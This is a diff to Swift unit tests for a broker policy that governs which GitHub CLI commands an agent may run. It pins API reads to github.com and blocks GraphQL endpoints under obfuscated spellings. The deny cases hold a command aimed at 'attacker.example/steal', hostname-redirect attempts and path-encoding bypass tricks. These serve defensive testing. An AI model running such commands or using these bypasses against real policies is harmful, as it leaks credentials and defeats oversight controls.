@@ -15,6 +15,8 @@ struct GitHubHostControlPolicyTests {
         ["api", "--method=head", "repos/example/project"],
         ["api", "-iX", "GET", "repos/example/project"],
         ["api", "repos/{owner}/{repo}/compare/a...b", "--paginate", "--slurp", "--silent"],
+        ["api", "repos/example/project/contents/docs/graphql.md"],
+        ["api", "user", "--template", "--hostname"],
         ["api", "--hostname", "github.com", "--cache", "1h", "repos/example/project", "-t", "{{.name}}"]
     ])
     func allowsReads(_ arguments: [String]) {
@@ -59,6 +61,13 @@ struct GitHubHostControlPolicyTests {
         ["api", "graphql", "-f", "query={viewer{login}}"],
         ["api", "graphql"],
         ["api", "/graphql"],
+        // The path gh requests, however the endpoint is spelled.
+        ["api", "graphql#ignored", "-H", "Accept: application/vnd.github.v4.idl"],
+        ["api", "//GraphQL/?x=1"],
+        ["api", "./graphql"],
+        ["api", "graph%71l"],
+        ["api", "repos/o/r/../../../graphql"],
+        ["--", "api", "user"],
         ["api", "https://attacker.example/steal"],
         ["api", "--hostname", "attacker.example", "repos/example/project"],
         ["api", "--hostname=enterprise.example", "repos/example/project"],
@@ -79,16 +88,23 @@ struct GitHubHostControlPolicyTests {
     /// Without `--hostname`, gh sends an api request to its default host
     /// (`GH_HOST`, or the only host it is signed in to) with that host's
     /// credentials; the broker pins API reads to github.com instead.
-    @Test("API reads run pinned to github.com; other commands run as given", arguments: [
-        (["api", "user"], ["api", "user", "--hostname", "github.com"]),
-        (["api", "-XGET", "repos/o/r"], ["api", "-XGET", "repos/o/r", "--hostname", "github.com"]),
-        (["api", "--", "repos/o/r"], ["api", "--hostname", "github.com", "--", "repos/o/r"]),
-        (["api", "--hostname", "github.com", "user"], ["api", "--hostname", "github.com", "user"]),
-        (["api", "--hostname=github.com", "user"], ["api", "--hostname=github.com", "user"]),
-        (["pr", "view", "1"], ["pr", "view", "1"])
-    ])
-    func apiReadsArePinned(_ given: [String], _ executed: [String]) {
-        #expect(GitHubHostControlPolicy.executionArguments(for: given) == executed)
+    /// Each case: what the agent asked, what the broker runs.
+    static let pinCases: [PinCase] = [
+        PinCase(["api", "user"], ["api", "--hostname", "github.com", "user"]),
+        PinCase(["api", "-XGET", "repos/o/r"], ["api", "--hostname", "github.com", "-XGET", "repos/o/r"]),
+        PinCase(["api", "--", "repos/o/r"], ["api", "--hostname", "github.com", "--", "repos/o/r"]),
+        PinCase(["api", "--hostname", "github.com", "user"], ["api", "--hostname", "github.com", "user"]),
+        PinCase(["api", "--hostname=github.com", "user"], ["api", "--hostname=github.com", "user"]),
+        // A word another option consumes is not a host option or a separator.
+        PinCase(["api", "user", "--template", "--hostname"],
+                ["api", "--hostname", "github.com", "user", "--template", "--hostname"]),
+        PinCase(["api", "user", "--template", "--"], ["api", "--hostname", "github.com", "user", "--template", "--"]),
+        PinCase(["pr", "view", "1"], ["pr", "view", "1"])
+    ]
+
+    @Test("API reads run pinned to github.com; other commands run as given", arguments: pinCases)
+    func apiReadsArePinned(_ pin: PinCase) {
+        #expect(GitHubHostControlPolicy.executionArguments(for: pin.given) == pin.executed)
     }
 
     @Test("The broker runs an unpinned API read against github.com even when gh's default is another host")
@@ -107,7 +123,7 @@ struct GitHubHostControlPolicyTests {
             let line = String(decoding: try JSONSerialization.data(withJSONObject: request), as: UTF8.self)
             _ = try #require(server.handleLine(line))
         }
-        #expect(runner.arguments == [["api", "user", "--hostname", "github.com"], ["pr", "view", "1"]])
+        #expect(runner.arguments == [["api", "--hostname", "github.com", "user"], ["pr", "view", "1"]])
     }
 
     @Test("Browser launch and token display stay denied with their own reasons")
@@ -132,4 +148,14 @@ private final class PinRecordingRunner: HostControlProcessRunning {
         self.arguments.append(arguments)
         return HostControlCommandResult(command: executablePath, arguments: arguments, exitCode: 0, stdout: "{}", stderr: "")
     }
+}
+
+struct PinCase: Sendable, CustomTestStringConvertible {
+    let given: [String]
+    let executed: [String]
+    init(_ given: [String], _ executed: [String]) {
+        self.given = given
+        self.executed = executed
+    }
+    var testDescription: String { given.joined(separator: " ") }
 }
